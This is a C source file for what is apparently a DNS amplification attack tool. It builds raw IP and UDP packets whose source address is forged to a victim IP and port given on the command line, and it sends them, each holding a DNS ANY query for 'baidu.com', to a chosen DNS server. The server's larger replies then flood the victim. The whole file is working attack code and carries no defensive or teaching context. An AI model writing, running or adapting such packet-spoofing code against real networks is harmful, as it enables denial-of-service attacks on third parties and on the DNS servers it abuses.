#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
typedef struct iphdr iph;
typedef struct udphdr udph;

typedef struct
{
	unsigned short id;   	// ID
	unsigned short flags;	// DNS Flags
	unsigned short qcount;	// Question Count
	unsigned short ans;	// Answer Count
	unsigned short auth;	// Authority RR
	unsigned short add;	// Additional RR
}dns_hdr;

typedef struct
{
	unsigned short qtype;
	unsigned short qclass;
}query;

unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void dns_format(unsigned char * dns,unsigned char * host) 
{
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

int main(int argc, char **argv)
{
	char *target_ip = argv[1];
	int target_port = atoi(argv[2]);
	char *dns_srv = argv[3];
	
	//declare 128 bit for dns data
	unsigned char dns_data[128];
	dns_hdr *dns = (dns_hdr *)&dns_data;
	dns->id = (unsigned short)htons(0xDFCD);
	dns->flags = htons(0x0100);
	dns->qcount = htons(1);
	dns->ans = 0;
	dns->auth = 0;
	dns->add = 0;
	
	//DNS question
	unsigned char *dns_name, dns_rcrd[32];
	dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
	strcpy(dns_rcrd, "baidu.com");
	dns_format(dns_name , dns_rcrd);	
	query *q1;
	q1 = (query *)&dns_data[sizeof(dns_hdr) + (strlen(dns_name)+1)];
	q1->qtype = htons(255);
	q1->qclass = htons(0x1);
	
	
	//packet
	char datagram[4096], *data;
    	memset(datagram, 0, 4096);
    
	data = datagram + sizeof(iph) + sizeof(udph);
    	memcpy(data, &dns_data, sizeof(dns_hdr)+ (strlen(dns_name)+1) + sizeof(query));

	struct sockaddr_in sin;
    	sin.sin_family = AF_INET;
   	sin.sin_port = htons(53);
    	sin.sin_addr.s_addr = inet_addr(dns_srv);
	
	iph *ip = (iph *)datagram;
    	ip->version = 4;
    	ip->ihl = 5;
    	ip->tos = 0;
    	ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name)+1) + sizeof(query);
    	ip->id = htons(getpid());
	ip->frag_off = 0;
    	ip->ttl = 64;
    	ip->protocol = IPPROTO_UDP;
    	ip->check = 0;
    	ip->saddr = inet_addr(target_ip);
    	ip->daddr = sin.sin_addr.s_addr;
	ip->check = csum((unsigned short *)datagram, ip->tot_len);
	
	udph *udp = (udph *)(datagram + sizeof(iph));
	udp->source = htons(target_port);
    	udp->dest = htons(53);
    	udp->len = htons(8+sizeof(dns_hdr)+(strlen(dns_name)+1)+sizeof(query));
    	udp->check = (unsigned short)0;
	

	int sd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	int one = 1;
	const int *val = &one;
	setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
	for(int i=0;i<3;i++)
	{
		int success = sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
		if(success == -1)
		{
			printf("%d\n",errno);
		}
		
	}	
	//close(sd);
}
